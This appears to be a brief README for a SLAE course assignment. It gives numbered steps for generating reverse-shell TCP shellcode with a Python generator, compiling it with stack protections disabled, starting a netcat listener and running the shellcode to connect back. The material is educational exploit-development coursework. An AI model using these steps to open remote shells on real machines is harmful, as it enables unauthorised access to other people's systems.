https://securitychops.com/2018/05/21/slae-assignment-2-reverse-shell-tcp-shellcode.html

1. Run ./shellcode-generator.py PortNumber IpAddress
    - (ie ./shellcode-generator.py 4444 10.0.7.17)
2. Paste shellcode into shellcode.c
3. Compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
4. On machine to connect to: nc -nvlp port-number
5. From machine to connect from: ./shellcode
6. Done
